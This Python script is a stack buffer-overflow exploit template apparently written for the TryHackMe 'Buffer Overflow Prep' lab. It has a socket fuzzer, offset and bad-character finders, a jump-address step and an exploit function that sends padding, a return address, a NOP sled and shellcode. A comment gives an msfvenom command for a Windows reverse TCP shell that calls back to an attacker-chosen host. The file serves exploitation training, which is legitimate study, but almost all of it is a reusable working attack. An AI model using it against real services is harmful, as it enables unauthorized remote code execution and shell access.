#!/usr/bin/env python3
"""
####################################################################
Buffer Overflow script created by Gustavo Bobbio-Hertog (defendergb@)

Created to work against TryHackMe "Buffer Overflow Prep" room.
####################################################################
"""

import socket, time, sys

# Target Values [Modify per target]
ip = "10.10.0.1"
port = 1337
timeout = 5

# Buffer Environment Values
buff = "A"
prefix = "OVERFLOW1 "

####################################################################
# STEP 1: Fuzzer Value
####################################################################
fuzzincrement = 500

####################################################################
# STEP 2: Offset Finder Values
####################################################################
""" 
Use msf's pattern_create to create a cyclical pattern payload and use pattern_offset to determine the 
offset per values found under EIP ones it crashed: (try doing 400 bytes more than when it crashed)

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134 -l 2400

You can also use mona to find offset in Immunity Debugger :
!mona findmsp -distance 2400

Paste the pattern here:
"""
offsetpayload = ""

####################################################################
# STEP 3: Bad Character Finder Values
####################################################################
"""
Follow the dump of ESP and check for what bad character is not working and remove the first bad char
You can use mona to detect bad characters too:
!mona bytearray -b "\x00"
!mona compare -f C:\mona\oscp\bytearray.bin -a <OFFSET-ADDRESS>

Set found offset value and remove bad characters as found:
"""
offset = 2100
char_payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

####################################################################
# STEP 4: Find Jump Point
####################################################################
"""
On Immunity Debugger use mona to find jump point, ensure to exclude bad chars:
!mona jmp -r esp -cpb "\x00"

Once found, set a breakpoint on jump address and ensure that it jumps to the address.
"""
jump_retrn = "\x01\x02" #Add little endian byte version of jump address: e.g 0201

####################################################################
# STEP 5: Exploit Values
####################################################################
"""
Generate a payload and add bad chars:
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=443 EXITFUNC=thread -b "\x00" -f py
"""
exploit_payload = ("")


#######################
# Methods for buffer.py
#######################

# Fuzzer - Sends buff overflow in increments until it crashes. Will output where it crashed.
def fuzzer():
	fuzz = prefix + buff * fuzzincrement
	while True:
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				s.settimeout(timeout)
				s.connect((ip, port))
				s.recv(1024)
				print("Fuzzing with {} bytes".format(len(fuzz) - len(prefix)))
				s.send(bytes(fuzz, "latin-1"))
				s.recv(1024)
		except:
			print("Fuzzing crashed at {} bytes".format(len(fuzz) - len(prefix)))
			sys.exit(0)
		fuzz += 100 * "A"
		time.sleep(1)

# General buffer sender that will be used by other methods
def payloadsender(buffer):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect((ip, port))
		print("[+] Sending buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
		print("Could not connect to {}.".format(ip))

# Offset Finder - Sends pattern to find offset address
def offsetfinder():
	buffer = prefix + offsetpayload 
	payloadsender(buffer)

# Bad Characters Finder - Sends characters to allow debug of characters that cause buffer to get modified or end
def badchars():
	overflow = buff * offset
	retrn = "BBBB"
	buffer = prefix + overflow + retrn + char_payload
	payloadsender(buffer)

# Find Jump - Sends jump address and allows further debugging using breakpoints
def findjump():
	overflow = buff * offset
	buffer = prefix + overflow + jump_retrn
	payloadsender(buffer)

# Exploit - Sends exploit reverse shell with padding
def exploit():
	overflow = buff * offset
	padding = "\x90" * 16 # Adds "No Operation" bytes (NOPs) as padding
	buffer = prefix + overflow + jump_retrn + padding + exploit_payload
	payloadsender(buffer)

#Uncomment to run methods
#fuzzer()
#offsetfinder()
#badchars()
#findjump()
#exploit()
